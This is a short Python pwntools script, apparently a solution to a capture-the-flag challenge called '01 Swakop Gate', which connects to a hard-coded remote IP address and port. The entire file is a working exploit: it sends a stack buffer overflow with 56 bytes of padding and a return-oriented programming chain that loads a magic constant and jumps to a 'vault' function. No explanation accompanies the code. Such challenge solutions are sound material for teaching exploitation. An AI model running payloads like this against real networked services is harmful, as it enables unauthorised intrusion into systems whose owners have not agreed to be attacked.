#!/usr/bin/env python3
"""01 Swakop Gate: remote blind solve (pwntools + network only)."""
from pwn import *

HOST = '167.86.100.57'
PORT = 9001

POP_RDI = 0x4013ef
RET     = 0x40101a
VAULT   = 0x4012a4
MAGIC   = 0xc0ffee00001337

context.arch = 'amd64'
context.log_level = 'error'
io = remote(HOST, PORT)
io.recvuntil(b'callsign?')

payload = flat({
    56: [
        RET,
        POP_RDI,
        MAGIC,
        VAULT,
    ]
})
io.send(payload)
print(io.recvall(timeout=2).decode(errors='ignore'), end='')
